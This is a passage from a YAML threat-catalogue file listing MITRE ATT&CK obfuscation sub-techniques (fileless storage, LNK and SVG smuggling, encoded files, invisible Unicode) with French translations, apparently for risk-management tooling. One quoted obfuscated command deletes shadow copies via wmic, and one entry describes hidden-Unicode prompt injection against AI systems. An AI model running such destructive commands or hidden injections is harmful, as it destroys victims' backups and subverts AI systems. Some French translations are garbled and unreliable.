          \ des astuces telles que des travers\xE9es de r\xE9pertoires pour obscurcir\
          \ les r\xE9f\xE9rences au binaire invoqu\xE9 par une commande ('C\_:\\voi\\\
          pcw\\.. \\.. \\Windows\\tei\\qs\\k\\.. \\.. \\.. \\system32\\erool\\.. \\\
          wbem\\wg\\je\\.. \\.. \\wmic.exe supprimer la copie de l\u2019ombre'). (Citation\
          \ : Twitter Richard WMIC)\n\nDes outils tels que <code>Invoke-Obfuscation</code>\
          \ et <code>Invoke-DOSfucation</code> ont \xE9galement \xE9t\xE9 utilis\xE9\
          s pour obscurcir les commandes. (Citation : Invoke-DOSfuscation)(Citation\
          \ : Invocation-Obfuscation)\nhttps://attack.mitre.org/techniques/T1027/010"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1027.011
    ref_id: T1027.011
    name: Fileless Storage
    description: "Adversaries may store data in \"fileless\" formats to conceal malicious\
      \ activity from defenses. Fileless storage can be broadly defined as any format\
      \ other than a file. Common examples of non-volatile fileless storage in Windows\
      \ systems include the Windows Registry, event logs, or WMI repository.(Citation:\
      \ Microsoft Fileless)(Citation: SecureList Fileless) Shared memory directories\
      \ on Linux systems (`/dev/shm`, `/run/shm`, `/var/run`, and `/var/lock`) and\
      \ volatile directories on Network Devices (`/tmp` and `/volatile`) may also\
      \ be considered fileless storage, as files written to these directories are\
      \ mapped directly to RAM and not stored on the disk.(Citation: Elastic Binary\
      \ Executed from Shared Memory Directory)(Citation: Akami Frog4Shell 2024)(Citation:\
      \ Aquasec Muhstik Malware 2024)(Citation: Bitsight 7777 Botnet)(Citation: CISCO\
      \ Nexus 900 Config).\n\nSimilar to fileless in-memory behaviors such as [Reflective\
      \ Code Loading](https://attack.mitre.org/techniques/T1620) and [Process Injection](https://attack.mitre.org/techniques/T1055),\
      \ fileless data storage may remain undetected by antivirus and other endpoint\
      \ security tools that can only access specific file formats from disk storage.\
      \ Leveraging fileless storage may also allow adversaries to bypass the protections\
      \ offered by read-only file systems in Linux.(Citation: Sysdig Fileless Malware\
      \ 23022)\n\nAdversaries may use fileless storage to conceal various types of\
      \ stored data, including payloads/shellcode (potentially being used as part\
      \ of [Persistence](https://attack.mitre.org/tactics/TA0003)) and collected data\
      \ not yet exfiltrated from the victim (e.g., [Local Data Staging](https://attack.mitre.org/techniques/T1074/001)).\
      \ Adversaries also often encrypt, encode, splice, or otherwise obfuscate this\
      \ fileless data when stored. \n\nSome forms of fileless storage activity may\
      \ indirectly create artifacts in the file system, but in central and otherwise\
      \ difficult to inspect formats such as the WMI (e.g., `%SystemRoot%\\System32\\\
      Wbem\\Repository`) or Registry (e.g., `%SystemRoot%\\System32\\Config`) physical\
      \ files.(Citation: Microsoft Fileless)\nhttps://attack.mitre.org/techniques/T1027/011"
    translations:
      fr:
        name: Stockage sans fichiers
        description: "Les adversaires peuvent stocker les donn\xE9es sous forme \xAB\
          \ sans fichier \xBB afin de dissimuler toute activit\xE9 malveillante aux\
          \ d\xE9fenses. Le stockage sans fichiers peut \xEAtre d\xE9fini de mani\xE8\
          re large comme n\u2019importe quel format autre qu\u2019un fichier. Des\
          \ exemples courants de stockage sans fichiers non volatils dans les syst\xE8\
          mes Windows incluent le Registre Windows, les journaux d\u2019\xE9v\xE9\
          nements ou le d\xE9p\xF4t WMI. (Citation : Microsoft Fileless)(Citation\
          \ : SecureList Sans fichiers) Les r\xE9pertoires de m\xE9moire partag\xE9\
          e sur les syst\xE8mes Linux ('/dev/shm', '/run/shm', '/var/run' et '/var/lock')\
          \ et les r\xE9pertoires volatiles sur les dispositifs r\xE9seau ('/tmp'\
          \ et '/volatile') peuvent \xE9galement \xEAtre consid\xE9r\xE9s comme du\
          \ stockage sans fichiers, car les fichiers \xE9crits dans ces r\xE9pertoires\
          \ sont mapp\xE9s directement \xE0 la RAM et non stock\xE9s sur le disque.\
          \ (Citation : Binaire \xE9lastique ex\xE9cut\xE9 depuis un r\xE9pertoire\
          \ m\xE9moire partag\xE9e)(Citation : Akami Frog4Shell 2024)(Citation : Aquasec\
          \ Muhstik Malware 2024)(Citation : Bitsight 7777 Botnet)(Citation : CISCO\
          \ Nexus 900 Config).\n\n\xC0 l\u2019instar des comportements en m\xE9moire\
          \ sans fichiers tels que [Chargement de code r\xE9fl\xE9chissant](https://attack.mitre.org/techniques/T1620)\
          \ et [Injection de processus](https://attack.mitre.org/techniques/T1055),\
          \ le stockage de donn\xE9es sans fichiers peut rester ind\xE9tect\xE9 par\
          \ les antivirus et autres outils de s\xE9curit\xE9 des points de terminaison\
          \ qui ne peuvent acc\xE9der qu\u2019\xE0 des formats de fichiers sp\xE9\
          cifiques depuis le stockage disque. L\u2019utilisation du stockage sans\
          \ fichiers peut \xE9galement permettre aux adversaires de contourner les\
          \ protections offertes par les syst\xE8mes de fichiers en lecture seule\
          \ sous Linux. (Citation : Sysdig Fileless Malware 23022)\n\nLes adversaires\
          \ peuvent utiliser le stockage sans fichiers pour dissimuler divers types\
          \ de donn\xE9es stock\xE9es, y compris des charges utiles/shellcode (potentiellement\
          \ utilis\xE9s dans le cadre de [Persistance](https://attack.mitre.org/tactics/TA0003))\
          \ et des donn\xE9es collect\xE9es non encore exfiltr\xE9es de la victime\
          \ (par exemple, [Local Data Staging](https://attack.mitre.org/techniques/T1074/001)).\
          \ Les adversaires chiffrent, encodent, spinter ou obscurcissent \xE9galement\
          \ souvent ces donn\xE9es sans fichiers lorsqu\u2019elles sont stock\xE9\
          es. \n\nCertaines formes d\u2019activit\xE9 de stockage sans fichiers peuvent\
          \ indirectement cr\xE9er des artefacts dans le syst\xE8me de fichiers, mais\
          \ dans des formats centraux et autrement difficiles \xE0 inspecter comme\
          \ les fichiers WMI (par exemple, \xAB %SystemRoot\_%\\System32\\Wbem\\Repository\
          \ \xBB) ou le Registre (par exemple, \xAB %SystemRoot\_%\\System32\\Config\
          \ \xBB) les fichiers physiques. (Citation : Microsoft Fileless)\nhttps://attack.mitre.org/techniques/T1027/011"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1027.012
    ref_id: T1027.012
    name: LNK Icon Smuggling
    description: "Adversaries may smuggle commands to download malicious payloads\
      \ past content filters by hiding them within otherwise seemingly benign windows\
      \ shortcut files. Windows shortcut files (.LNK) include many metadata fields,\
      \ including an icon location field (also known as the `IconEnvironmentDataBlock`)\
      \ designed to specify the path to an icon file that is to be displayed for the\
      \ LNK file within a host directory. \n\nAdversaries may abuse this LNK metadata\
      \ to download malicious payloads. For example, adversaries have been observed\
      \ using LNK files as phishing payloads to deliver malware. Once invoked (e.g.,\
      \ [Malicious File](https://attack.mitre.org/techniques/T1204/002)), payloads\
      \ referenced via external URLs within the LNK icon location field may be downloaded.\
      \ These files may also then be invoked by [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059)/[System\
      \ Binary Proxy Execution](https://attack.mitre.org/techniques/T1218) arguments\
      \ within the target path field of the LNK.(Citation: Unprotect Shortcut)(Citation:\
      \ Booby Trap Shortcut 2017)\n\nLNK Icon Smuggling may also be utilized post\
      \ compromise, such as malicious scripts executing an LNK on an infected host\
      \ to download additional malicious payloads.\nhttps://attack.mitre.org/techniques/T1027/012"
    translations:
      fr:
        name: "Contrebande d\u2019ic\xF4nes LNK"
        description: "Les adversaires peuvent faire passer en douce des commandes\
          \ de t\xE9l\xE9chargement de charges malveillantes au-del\xE0 des filtres\
          \ de contenu en les dissimulant dans des raccourcis Windows apparemment\
          \ inoffensifs. Fichiers de raccourcis Windows (. LNK) incluent de nombreux\
          \ champs de m\xE9tadonn\xE9es, dont un champ d\u2019emplacement d\u2019\
          ic\xF4nes (\xE9galement appel\xE9 \xAB IconEnvironmentDataBlock \xBB) con\xE7\
          u pour sp\xE9cifier le chemin vers un fichier d\u2019ic\xF4nes qui doit\
          \ \xEAtre affich\xE9 pour le fichier LNK dans un r\xE9pertoire h\xF4te.\
          \ \n\nLes adversaires peuvent abuser de ces m\xE9tadonn\xE9es LNK pour t\xE9\
          l\xE9charger des charges utiles malveillantes. Par exemple, des adversaires\
          \ ont \xE9t\xE9 observ\xE9s utilisant des fichiers LNK comme charges utiles\
          \ de phishing pour diffuser des malwares. Une fois invoqu\xE9s (par exemple,\
          \ [Fichier malveillant](https://attack.mitre.org/techniques/T1204/002)),\
          \ les charges utiles r\xE9f\xE9renc\xE9es via des URL externes dans le champ\
          \ d\u2019emplacement de l\u2019ic\xF4ne LNK peuvent \xEAtre t\xE9l\xE9charg\xE9\
          es. Ces fichiers peuvent \xE9galement \xEAtre invoqu\xE9s par des arguments\
          \ [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059)/[System\
          \ Binary Proxy Execution](https://attack.mitre.org/techniques/T1218) dans\
          \ le champ chemin cible du LNK. (Citation : Raccourci D\xE9sarmement)(Citation\
          \ : Raccourci Pi\xE8ge 2017)\n\nLa contrebande d\u2019ic\xF4nes LNK peut\
          \ \xE9galement \xEAtre utilis\xE9e apr\xE8s compromis, comme des scripts\
          \ malveillants ex\xE9cutant un LNK sur un h\xF4te infect\xE9 pour t\xE9\
          l\xE9charger des charges utiles malveillantes suppl\xE9mentaires.\nhttps://attack.mitre.org/techniques/T1027/012"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1027.013
    ref_id: T1027.013
    name: Encrypted/Encoded File
    description: "Adversaries may encrypt or encode files to obfuscate strings, bytes,\
      \ and other specific patterns to impede detection. Encrypting and/or encoding\
      \ file content aims to conceal malicious artifacts within a file used in an\
      \ intrusion. Many other techniques, such as [Software Packing](https://attack.mitre.org/techniques/T1027/002),\
      \ [Steganography](https://attack.mitre.org/techniques/T1027/003), and [Embedded\
      \ Payloads](https://attack.mitre.org/techniques/T1027/009), share this same\
      \ broad objective. Encrypting and/or encoding files could lead to a lapse in\
      \ detection of static signatures, only for this malicious content to be revealed\
      \ (i.e., [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140))\
      \ at the time of execution/use.\n\nThis type of file obfuscation can be applied\
      \ to many file artifacts present on victim hosts, such as malware log/configuration\
      \ and payload files.(Citation: File obfuscation) Files can be encrypted with\
      \ a hardcoded or user-supplied key, as well as otherwise obfuscated using standard\
      \ encoding schemes such as Base64.\n\nThe entire content of a file may be obfuscated,\
      \ or just specific functions or values (such as C2 addresses). Encryption and\
      \ encoding may also be applied in redundant layers for additional protection.\n\
      \nFor example, adversaries may abuse password-protected Word documents or self-extracting\
      \ (SFX) archives as a method of encrypting/encoding a file such as a [Phishing](https://attack.mitre.org/techniques/T1566)\
      \ payload. These files typically function by attaching the intended archived\
      \ content to a decompressor stub that is executed when the file is invoked (e.g.,\
      \ [User Execution](https://attack.mitre.org/techniques/T1204)).(Citation: SFX\
      \ - Encrypted/Encoded File) \n\nAdversaries may also abuse file-specific as\
      \ well as custom encoding schemes. For example, Byte Order Mark (BOM) headers\
      \ in text files may be abused to manipulate and obfuscate file content until\
      \ [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059)\
      \ execution.\nhttps://attack.mitre.org/techniques/T1027/013"
    translations:
      fr:
        name: "Fichier chiffr\xE9/encod\xE9"
        description: "Les adversaires peuvent chiffrer ou encoder des fichiers pour\
          \ obscurcir des cha\xEEnes, des octets et d\u2019autres motifs sp\xE9cifiques\
          \ afin d\u2019entraver la d\xE9tection. Le chiffrement et/ou l\u2019encodage\
          \ du contenu des fichiers vise \xE0 dissimuler des artefacts malveillants\
          \ dans un fichier utilis\xE9 lors d\u2019une intrusion. De nombreuses autres\
          \ techniques, telles que le [Software Packing](https://attack.mitre.org/techniques/T1027/002),\
          \ la [Steganography](https://attack.mitre.org/techniques/T1027/003) et les\
          \ [Chargements utiles embarqu\xE9s](https://attack.mitre.org/techniques/T1027/009),\
          \ partagent ce m\xEAme objectif large. Le chiffrement et/ou l\u2019encodage\
          \ de fichiers pouvait entra\xEEner une interruption de d\xE9tection de signatures\
          \ statiques, pour que ce contenu malveillant soit r\xE9v\xE9l\xE9 (c\u2019\
          est-\xE0-dire [D\xE9mod\xE9rer/D\xE9coder des fichiers ou informations](https://attack.mitre.org/techniques/T1140))\
          \ au moment de l\u2019ex\xE9cution/utilisation.\n\nCe type d\u2019obfuscation\
          \ de fichiers peut \xEAtre appliqu\xE9 \xE0 de nombreux artefacts de fichiers\
          \ pr\xE9sents sur les h\xF4tes victimes, tels que les fichiers de journaux/configuration\
          \ et de charge utile des malwares. (Citation : Brouillage de fichiers) Les\
          \ fichiers peuvent \xEAtre chiffr\xE9s avec une cl\xE9 cod\xE9e en dur ou\
          \ fournie par l\u2019utilisateur, ainsi que d\u2019autres \xE9l\xE9ments\
          \ obscurcis \xE0 l\u2019aide de sch\xE9mas d\u2019encodage standards tels\
          \ que Base64.\n\nL\u2019ensemble du contenu d\u2019un fichier peut \xEA\
          tre obfusqu\xE9, ou simplement des fonctions ou des valeurs sp\xE9cifiques\
          \ (comme les adresses C2). Le chiffrement et l\u2019encodage peuvent \xE9\
          galement \xEAtre appliqu\xE9s dans des couches redondantes pour une protection\
          \ suppl\xE9mentaire.\n\nPar exemple, les adversaires peuvent abuser de documents\
          \ Word prot\xE9g\xE9s par mot de passe ou d\u2019archives auto-extractibles\
          \ (SFX) comme m\xE9thode de chiffrement/encodage d\u2019un fichier, tel\
          \ qu\u2019une charge utile [Phishing](https://attack.mitre.org/techniques/T1566).\
          \ Ces fichiers fonctionnent g\xE9n\xE9ralement en attachant le contenu archiv\xE9\
          \ pr\xE9vu \xE0 un stub de d\xE9compresseur ex\xE9cut\xE9 lors de l\u2019\
          invocation du fichier (par exemple, [User Execution](https://attack.mitre.org/techniques/T1204)).\
          \ (Citation : SFX - Fichier chiffr\xE9/cod\xE9) \n\nLes adversaires peuvent\
          \ \xE9galement abuser des sch\xE9mas d\u2019encodage sp\xE9cifiques \xE0\
          \ un fichier ainsi que des sch\xE9mas personnalis\xE9s. Par exemple, les\
          \ en-t\xEAtes Byte Order Mark (BOM) dans les fichiers texte peuvent \xEA\
          tre abus\xE9s pour manipuler et obscurcir le contenu des fichiers jusqu\u2019\
          \xE0 l\u2019ex\xE9cution du [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059).\n\
          https://attack.mitre.org/techniques/T1027/013"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1027.014
    ref_id: T1027.014
    name: Polymorphic Code
    description: "Adversaries may utilize polymorphic code (also known as metamorphic\
      \ or mutating code) to evade detection. Polymorphic code is a type of software\
      \ capable of changing its runtime footprint during code execution.(Citation:\
      \ polymorphic-blackberry) With each execution of the software, the code is mutated\
      \ into a different version of itself that achieves the same purpose or objective\
      \ as the original. This functionality enables the malware to evade traditional\
      \ signature-based defenses, such as antivirus and antimalware tools.(Citation:\
      \ polymorphic-sentinelone) \nOther obfuscation techniques can be used in conjunction\
      \ with polymorphic code to accomplish the intended effects, including using\
      \ mutation engines to conduct actions such as [Software Packing](https://attack.mitre.org/techniques/T1027/002),\
      \ [Command Obfuscation](https://attack.mitre.org/techniques/T1027/010), or [Encrypted/Encoded\
      \ File](https://attack.mitre.org/techniques/T1027/013).(Citation: polymorphic-linkedin)(Citation:\
      \ polymorphic-medium)\nhttps://attack.mitre.org/techniques/T1027/014"
    translations:
      fr:
        name: Code polymorphe
        description: "Les adversaires peuvent utiliser du code polymorphe (\xE9galement\
          \ appel\xE9 code m\xE9tamorphique ou code mutant) pour \xE9chapper \xE0\
          \ la d\xE9tection. Le code polymorphe est un type de logiciel capable de\
          \ modifier son empreinte \xE0 l\u2019ex\xE9cution lors de l\u2019ex\xE9\
          cution du code. (Citation : m\xFBre polymorphe) \xC0 chaque ex\xE9cution\
          \ du logiciel, le code est transform\xE9 en une version diff\xE9rente de\
          \ lui-m\xEAme qui atteint le m\xEAme but ou objectif que l\u2019original.\
          \ Cette fonctionnalit\xE9 permet au malware d\u2019\xE9chapper aux d\xE9\
          fenses traditionnelles bas\xE9es sur la signature, telles que les antivirus\
          \ et les outils antimalware. (Citation : sentinellone polymorphe) \nD\u2019\
          autres techniques d\u2019obfuscation peuvent \xEAtre utilis\xE9es en conjonction\
          \ avec du code polymorphe pour obtenir les effets escompt\xE9s, notamment\
          \ l\u2019utilisation de moteurs de mutation pour effectuer des actions telles\
          \ que [Software Packing](https://attack.mitre.org/techniques/T1027/002),\
          \ [Command Obfuscation](https://attack.mitre.org/techniques/T1027/010) ou\
          \ [Fichier chiffr\xE9/encod\xE9](https://attack.mitre.org/techniques/T1027/013).\
          \ (Citation : polymorphique-li\xE9d\xE9)(Citation : polymorphe-medium)\n\
          https://attack.mitre.org/techniques/T1027/014"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1027.015
    ref_id: T1027.015
    name: Compression
    description: 'Adversaries may use compression to obfuscate their payloads or files.
      Compressed file formats such as ZIP, gzip, 7z, and RAR can compress and archive
      multiple files together to make it easier and faster to transfer files. In addition
      to compressing files, adversaries may also compress shellcode directly - for
      example, in order to store it in a Windows Registry key (i.e., [Fileless Storage](https://attack.mitre.org/techniques/T1027/011)).(Citation:
      Trustwave Pillowmint June 2020)


      In order to further evade detection, adversaries may combine multiple ZIP files
      into one archive. This process of concatenation creates an archive that appears
      to be a single archive but in fact contains the central directories of the embedded
      archives. Some ZIP readers, such as 7zip, may not be able to identify concatenated
      ZIP files and miss the presence of the malicious payload.(Citation: Perception
      Point)


      File archives may be sent as one [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001)
      through email. Adversaries have sent malicious payloads as archived files to
      encourage the user to interact with and extract the malicious payload onto their
      system (i.e., [Malicious File](https://attack.mitre.org/techniques/T1204/002)).(Citation:
      NTT Security Flagpro new December 2021) However, some file compression tools,
      such as 7zip, can be used to produce self-extracting archives. Adversaries may
      send self-extracting archives to hide the functionality of their payload and
      launch it without requiring multiple actions from the user.(Citation: The Hacker
      News)


      [Compression](https://attack.mitre.org/techniques/T1027/015) may be used in
      combination with [Encrypted/Encoded File](https://attack.mitre.org/techniques/T1027/013)
      where compressed files are encrypted and password-protected.'
    translations:
      fr:
        name: Compression
        description: "Les adversaires peuvent utiliser la compression pour obscurcir\
          \ leurs charges utiles ou fichiers. Les formats de fichiers compress\xE9\
          s tels que ZIP, gzip, 7z et RAR peuvent compresser et archiver plusieurs\
          \ fichiers ensemble pour faciliter et acc\xE9l\xE9rer le transfert de fichiers.\
          \ En plus de compresser les fichiers, les adversaires peuvent aussi compresser\
          \ directement le shellcode \u2013 par exemple, afin de le stocker dans une\
          \ cl\xE9 du registre Windows (c\u2019est-\xE0-dire [Stockage sans fichiers](https://attack.mitre.org/techniques/T1027/011)).\
          \ (Citation : Trustwave Pillowmint juin 2020)\n\nPour \xE9viter davantage\
          \ la d\xE9tection, les adversaires peuvent combiner plusieurs fichiers ZIP\
          \ en une seule archive. Ce processus de concat\xE9nation cr\xE9e une archive\
          \ qui semble \xEAtre une seule archive mais qui contient en r\xE9alit\xE9\
          \ les r\xE9pertoires centraux des archives int\xE9gr\xE9es. Certains lecteurs\
          \ ZIP, comme 7zip, peuvent ne pas \xEAtre capables d\u2019identifier les\
          \ fichiers ZIP concat\xE9n\xE9s et de ne pas d\xE9tecter la pr\xE9sence\
          \ de la charge utile malveillante. (Citation : Point de Perception)\n\n\
          Les archives de fichiers peuvent \xEAtre envoy\xE9es sous forme d\u2019\
          une seule [pi\xE8ce jointe Spearphishing](https://attack.mitre.org/techniques/T1566/001)\
          \ par e-mail. Les adversaires ont envoy\xE9 des charges utiles malveillantes\
          \ sous forme de fichiers archiv\xE9s pour encourager l\u2019utilisateur\
          \ \xE0 interagir avec et \xE0 extraire la charge utile malveillante sur\
          \ leur syst\xE8me (c\u2019est-\xE0-dire [Fichier malveillant](https://attack.mitre.org/techniques/T1204/002)).\
          \ (Citation : NTT Security Flagpro nouveau d\xE9cembre 2021) Cependant,\
          \ certains outils de compression de fichiers, comme 7zip, peuvent \xEAtre\
          \ utilis\xE9s pour produire des archives auto-extractibles. Les adversaires\
          \ peuvent envoyer des archives auto-extractibles pour masquer la fonctionnalit\xE9\
          \ de leur charge utile et la lancer sans n\xE9cessiter de multiples actions\
          \ de la part de l\u2019utilisateur. (Citation : The Hacker News)\n\n[Compression](https://attack.mitre.org/techniques/T1027/015)\
          \ peut \xEAtre utilis\xE9 en combinaison avec [fichier chiffr\xE9/encod\xE9\
          ](https://attack.mitre.org/techniques/T1027/013) o\xF9 les fichiers compress\xE9\
          s sont chiffr\xE9s et prot\xE9g\xE9s par mot de passe."
  - urn: urn:intuitem:risk:threat:mitre-attack:t1027.016
    ref_id: T1027.016
    name: Junk Code Insertion
    description: "Adversaries may use junk code / dead code to obfuscate a malware\u2019\
      s functionality. Junk code is code that either does not execute, or if it does\
      \ execute, does not change the functionality of the code. Junk code makes analysis\
      \ more difficult and time-consuming, as the analyst steps through non-functional\
      \ code instead of analyzing the main code. It also may hinder detections that\
      \ rely on static code analysis due to the use of benign functionality, especially\
      \ when combined with [Compression](https://attack.mitre.org/techniques/T1027/015)\
      \ or [Software Packing](https://attack.mitre.org/techniques/T1027/002).(Citation:\
      \ ReasonLabs)(Citation: ReasonLabs Cyberpedia Junk Code)\n\nNo-Operation (NOP)\
      \ instructions are an example of dead code commonly used in x86 assembly language.\
      \ They are commonly used as the 0x90 opcode. When NOPs are added to malware,\
      \ the disassembler may show the NOP instructions, leading to the analyst needing\
      \ to step through them.(Citation: ReasonLabs)\n\nThe use of junk / dead code\
      \ insertion is distinct from [Binary Padding](https://attack.mitre.org/techniques/T1027/001)\
      \ because the purpose is to obfuscate the functionality of the code, rather\
      \ than simply to change the malware\u2019s signature.\nhttps://attack.mitre.org/techniques/T1027/016"
    translations:
      fr:
        name: "Insertion de code ind\xE9sirable"
        description: "Les adversaires peuvent utiliser du code ind\xE9sirable ou du\
          \ code mort pour masquer la fonctionnalit\xE9 d\u2019un malware. Le code\
          \ ind\xE9sirable est un code qui ne s\u2019ex\xE9cute pas, soit, s\u2019\
          il s\u2019ex\xE9cute, ne modifie pas la fonctionnalit\xE9 du code. Le code\
          \ inutilisable rend l\u2019analyse plus difficile et chronophage, car l\u2019\
          analyste parcourt du code non fonctionnel au lieu d\u2019analyser le code\
          \ principal. Cela peut \xE9galement entraver les d\xE9tections qui reposent\
          \ sur une analyse statique du code en raison de l\u2019utilisation de fonctionnalit\xE9\
          s b\xE9nignes, notamment lorsqu\u2019elles sont combin\xE9es \xE0 [Compression](https://attack.mitre.org/techniques/T1027/015)\
          \ ou [Empaquetage logiciel](https://attack.mitre.org/techniques/T1027/002).\
          \ (Citation : ReasonLabs)(Citation : Code ind\xE9sirable Cyberpedia de ReasonLabs)\n\
          \nLes instructions No-Operation (NOP) sont un exemple de code mort couramment\
          \ utilis\xE9 en langage assembleur x86. Ils sont couramment utilis\xE9s\
          \ comme opcode 0x90. Lorsque les NOP sont ajout\xE9s \xE0 un malware, le\
          \ d\xE9sassembleur peut afficher les instructions NOP, obligeant l\u2019\
          analyste \xE0 les parcourir progressivement. (Citation : ReasonLabs)\n\n\
          L\u2019utilisation de l\u2019insertion de code ind\xE9sirable / mort est\
          \ distincte de [Binary Addding](https://attack.mitre.org/techniques/T1027/001)\
          \ car le but est d\u2019obscurcir la fonctionnalit\xE9 du code, plut\xF4\
          t que de simplement modifier la signature du malware.\nhttps://attack.mitre.org/techniques/T1027/016"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1027.017
    ref_id: T1027.017
    name: SVG Smuggling
    description: "Adversaries may smuggle data and files past content filters by hiding\
      \ malicious payloads inside of seemingly benign SVG files.(Citation: Trustwave\
      \ SVG Smuggling 2025) SVGs, or Scalable Vector Graphics, are vector-based image\
      \ files constructed using XML. As such, they can legitimately include `<script>`\
      \ tags that enable adversaries to include malicious JavaScript payloads. However,\
      \ SVGs may appear less suspicious to users than other types of executable files,\
      \ as they are often treated as image files. \n\nSVG smuggling can take a number\
      \ of forms. For example, threat actors may include content that: \n\n* Assembles\
      \ malicious payloads(Citation: Talos SVG Smuggling 2022)\n* Downloads malicious\
      \ payloads(Citation: Cofense SVG Smuggling 2024)\n* Redirects users to malicious\
      \ websites(Citation: Bleeping Computer SVG Smuggling 2024)\n* Displays interactive\
      \ content to users, such as fake login forms and download buttons.(Citation:\
      \ Bleeping Computer SVG Smuggling 2024)\n\nSVG Smuggling may be used in conjunction\
      \ with [HTML Smuggling](https://attack.mitre.org/techniques/T1027/006) where\
      \ an SVG with a malicious payload is included inside an HTML file.(Citation:\
      \ Talos SVG Smuggling 2022) SVGs may also be included in other types of documents,\
      \ such as PDFs.\nhttps://attack.mitre.org/techniques/T1027/017"
    translations:
      fr:
        name: Contrebande SVG
        description: "Les adversaires peuvent faire passer des donn\xE9es et des fichiers\
          \ \xE0 travers des filtres de contenu en dissimulant des charges utiles\
          \ malveillantes \xE0 l\u2019int\xE9rieur de fichiers SVG apparemment inoffensifs.\
          \ (Citation : Trustwave SVG Contrebande 2025) Les SVG, ou graphiques vectoriels\
          \ \xE9volutifs, sont des fichiers image vectoriels construits \xE0 l\u2019\
          aide de XML. Ainsi, ils peuvent l\xE9gitimement inclure <script>des balises\
          \ \xAB \xBB qui permettent aux adversaires d\u2019inclure des charges utiles\
          \ JavaScript malveillantes. Cependant, les SVG peuvent sembler moins suspects\
          \ aux utilisateurs que d\u2019autres types de fichiers ex\xE9cutables, car\
          \ ils sont souvent trait\xE9s comme des fichiers image. \n\nLa contrebande\
          \ de SVG peut prendre plusieurs formes. Par exemple, les acteurs malveillants\
          \ peuvent inclure du contenu qui : \n\n* Assemble des charges utiles malveillantes\
          \ (Citation : Talos SVG Smuggling 2022)\n* T\xE9l\xE9charge des charges\
          \ utiles malveillantes (Citation : Cofense SVG Smuggling 2024)\n* Redirige\
          \ les utilisateurs vers des sites malveillants (Citation : Smuggling SVG\
          \ Computer Bip 2024)\n* Affiche du contenu interactif aux utilisateurs,\
          \ comme de faux formulaires de connexion et des boutons de t\xE9l\xE9chargement.\
          \ (Citation : Contrebande SVG d\u2019ordinateur bip 2024)\n\nLa contrebande\
          \ SVG peut \xEAtre utilis\xE9e conjointement avec [Contrebande HTML](https://attack.mitre.org/techniques/T1027/006)\
          \ o\xF9 un SVG avec une charge utile malveillante est inclus dans un fichier\
          \ HTML. (Citation : Contrebande Talos SVG 2022) Les SVG peuvent \xE9galement\
          \ \xEAtre inclus dans d\u2019autres types de documents, comme les PDF.\n\
          https://attack.mitre.org/techniques/T1027/017"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1027.018
    ref_id: T1027.018
    name: Invisible Unicode
    description: "Adversaries may abuse invisible or non-printing Unicode characters\
      \ to conceal malicious content within files, scripts, or text. By inserting\
      \ characters that do not visibly render, adversaries may hide data, alter how\
      \ content is interpreted, or make malicious code appear as benign text or whitespace.\
      \ Adversaries may encode these malicious payloads, using binary, Base64, or\
      \ custom schemes, to be reconstructed at runtime through scripting features\
      \ such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) Proxy\
      \ traps, `eval()`, or other dynamic execution methods. This technique enables\
      \ adversaries to evade visual inspection and basic static analysis by hiding\
      \ malicious encoded content in innocuous text.(Citation: PUAs Unicode - Eriksen)(Citation:\
      \ Tycoon2FA - Unicode)(Citation: Unicode - Veracode) \n\nUnicode is a standardized\
      \ character encoding model that assigns a unique numerical value, known as a\
      \ code point, to every character across writing systems, enabling consistent\
      \ text representation across platforms, applications, and languages. Code points\
      \ are represented as `U+` followed by a hexadecimal value and may be encoded\
      \ using formats such as `UTF-8` or `UTF-16`. Adversaries may abuse the valid\
      \ code points in Unicode that are not visibly rendered but still take up bytes,\
      \ such as zero-width spaces, variation selectors, or bidirectional formatting\
      \ controls, to conceal malicious payloads.(Citation: Tycoon2FA - Unicode)(Citation:\
      \ GlassWorm - Unicode)(Citation: Unicode and Hidden Prompts - Perets)\n\nAdversaries\
      \ may additionally exploit Private Use Area (PUA) characters, a range of code\
      \ points reserved for custom assignment. PUA characters that are not defined\
      \ by a font or application are typically rendered blank.(Citation: PUAs Unicode\
      \ - Eriksen)\n\nUnicode characters may also be leveraged in support of other\
      \ techniques such as [Phishing](https://attack.mitre.org/techniques/T1660),\
      \ [Right-to-Left Override](https://attack.mitre.org/techniques/T1036/002), or\
      \ [User Execution](https://attack.mitre.org/techniques/T1204). For example,\
      \ some adversaries may embed artificial intelligence (AI) prompt injections\
      \ using invisible Unicode characters in emails or documents that appear benign\
      \ when processed by AI systems.(Citation: LLMs and Unicode - Medium)(Citation:\
      \ Invisible Prompt Injection - Trend Micro)\nhttps://attack.mitre.org/techniques/T1027/018"
    translations:
      fr:
        name: Invisible Unicode
        description: "Les adversaires peuvent abuser de caract\xE8res Unicode invisibles\
          \ ou non imprimants pour dissimuler du contenu malveillant dans des fichiers,\
          \ scripts ou textes. En ins\xE9rant des caract\xE8res qui ne s\u2019affichent\
          \ pas visiblement, les adversaires peuvent cacher des donn\xE9es, modifier\
          \ l\u2019interpr\xE9tation du contenu ou faire appara\xEEtre un code malveillant\
          \ comme du texte ou un espace blanc anodin. Les adversaires peuvent encoder\
          \ ces charges utiles malveillantes, en utilisant des sch\xE9mas binaires,\
          \ Base64 ou personnalis\xE9s, pour \xEAtre reconstruits \xE0 l\u2019ex\xE9\
          cution via des fonctionnalit\xE9s de script telles que [JavaScript](https://attack.mitre.org/techniques/T1059/007),\
          \ des pi\xE8ges proxy, 'eval()' ou d\u2019autres m\xE9thodes d\u2019ex\xE9\
          cution dynamique. Cette technique permet aux adversaires d\u2019\xE9chapper\
          \ \xE0 l\u2019inspection visuelle et \xE0 l\u2019analyse statique de base\
          \ en dissimulant un contenu cod\xE9 malveillant dans un texte anodin. (Citation\
          \ : PUAs Unicode - Eriksen)(Citation : Tycoon2FA - Unicode)(Citation : Unicode\
